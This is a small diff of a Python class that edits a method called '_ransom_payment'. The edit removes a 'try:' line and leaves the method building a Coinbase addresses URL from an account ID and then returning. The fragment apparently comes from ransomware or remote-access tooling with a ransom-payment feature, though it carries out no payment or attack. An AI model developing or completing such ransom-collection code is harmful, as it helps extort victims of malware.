@@ -605,8 +605,7 @@ class Client():
     @staticmethod
     @config(account_id=None, client_id=None, client_secret=None)
     def _ransom_payment():
-        try:
-            url = 'https://api.coinbase.com/v2/accounts/{}/addresses'.format(str(account_id))
+        url = 'https://api.coinbase.com/v2/accounts/{}/addresses'.format(str(account_id))
         return
 
 
